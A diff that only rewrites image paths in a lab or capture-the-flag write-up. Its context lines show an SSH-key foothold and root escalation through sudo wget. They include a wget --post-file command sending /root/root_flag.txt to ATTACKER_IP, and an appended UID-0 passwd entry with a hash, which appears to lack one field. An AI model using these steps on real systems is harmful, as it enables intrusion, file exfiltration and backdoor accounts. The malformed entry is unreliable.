@@ -10,7 +10,7 @@ The objective of this machine was to gain initial access by discovering an expos
 
 The first step was to scan the target and identify the exposed services.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717224658.png)
+![](../Images/Pasted%20image%2020260717224658.png)
 
 ---
 
@@ -18,11 +18,11 @@ The first step was to scan the target and identify the exposed services.
 
 Performed directory fuzzing to discover hidden resources.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717224755.png)
+![](../Images/Pasted%20image%2020260717224755.png)
 
 A hidden directory was discovered.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717224812.png)
+![](../Images/Pasted%20image%2020260717224812.png)
 
 ---
 
@@ -32,7 +32,7 @@ Performed another round of fuzzing against the newly discovered directory.
 
 This revealed an exposed **.ssh** directory.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717224942.png)
+![](../Images/Pasted%20image%2020260717224942.png)
 
 ---
 
@@ -40,7 +40,7 @@ This revealed an exposed **.ssh** directory.
 
 Inside the exposed directory, an SSH private key was found.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717225033.png)
+![](../Images/Pasted%20image%2020260717225033.png)
 
 Before using it, its permissions had to be restricted.
 
@@ -48,7 +48,7 @@ Before using it, its permissions had to be restricted.
 chmod 600 id_rsa
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717225116.png)
+![](../Images/Pasted%20image%2020260717225116.png)
 
 SSH refuses to use private keys that are readable by other users, so changing the permissions to **600** is required.
 
@@ -62,7 +62,7 @@ A valid username is also required.
 
 After reviewing the source code of the main page, a username was discovered.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717225237.png)
+![](../Images/Pasted%20image%2020260717225237.png)
 
 ---
 
@@ -70,7 +70,7 @@ After reviewing the source code of the main page, a username was discovered.
 
 Used the discovered username together with the private key to authenticate via SSH.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717225355.png)
+![](../Images/Pasted%20image%2020260717225355.png)
 
 Successfully obtained an initial shell on the target machine.
 
@@ -84,7 +84,7 @@ Enumerated SUDO permissions.
 sudo -l
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717225638.png)
+![](../Images/Pasted%20image%2020260717225638.png)
 
 The output showed that **wget** could be executed with **root privileges**.
 
@@ -114,7 +114,7 @@ The first technique is simply sending the root flag to our attacking machine.
 
 Start a Netcat listener.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717230303.png)
+![](../Images/Pasted%20image%2020260717230303.png)
 
 Then execute:
 
@@ -122,11 +122,11 @@ Then execute:
 sudo /usr/bin/wget --post-file=/root/root_flag.txt http://ATTACKER_IP:PORT
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717230327.png)
+![](../Images/Pasted%20image%2020260717230327.png)
 
 The listener receives the contents of the file.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717230412.png)
+![](../Images/Pasted%20image%2020260717230412.png)
 
 ---
 
@@ -149,7 +149,7 @@ A more reliable approach is to modify the **passwd** file.
 
 First, download the original file.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717230713.png)
+![](../Images/Pasted%20image%2020260717230713.png)
 
 ---
 
@@ -163,7 +163,7 @@ A password hash can be generated using OpenSSL.
 openssl passwd PASSWORD
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717231002.png)
+![](../Images/Pasted%20image%2020260717231002.png)
 
 ---
 
@@ -175,7 +175,7 @@ Append a new entry to the passwd file.
 mrwan:$1$0xLfcJG4$owY8jcczkoygh6TAUSrTN0:0:0:/root:/bin/bash
 ```
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717231242.png)
+![](../Images/Pasted%20image%2020260717231242.png)
 
 ### Field Breakdown
 
@@ -191,11 +191,11 @@ Since both **UID** and **GID** are set to **0**, the new account is treated as a
 
 Start a simple HTTP server.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717231842.png)
+![](../Images/Pasted%20image%2020260717231842.png)
 
 Transfer the modified passwd file back to the target using wget.
 
-![](Penetration%20Testing/Images/Pasted%20image%2020260717231932.png)
+![](../Images/Pasted%20image%2020260717231932.png)
 
 Once the file is replaced, log in using the newly created account and the password used to generate the hash.
 
